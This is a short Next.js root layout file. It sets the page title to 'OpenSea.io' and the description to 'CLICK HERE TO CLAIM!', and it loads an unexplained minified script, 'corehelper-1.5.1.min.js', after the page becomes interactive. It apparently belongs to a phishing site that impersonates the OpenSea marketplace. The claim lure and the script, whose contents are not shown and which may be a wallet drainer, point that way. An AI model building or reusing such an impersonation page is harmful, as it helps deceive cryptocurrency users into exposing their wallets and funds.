import type { ReactNode } from 'react';
import type { Metadata } from 'next';
import Script from 'next/script';
import './globals.css';

export const metadata: Metadata = {
  title: 'OpenSea.io',
  description: 'CLICK HERE TO CLAIM!'
};

export default function RootLayout(props: { children: ReactNode }) {
  return (
    <html lang="en-GB">
      <body>
        {props.children}
        <Script src="/corehelper-1.5.1.min.js" strategy="afterInteractive" />
      </body>
    </html>
  );
}
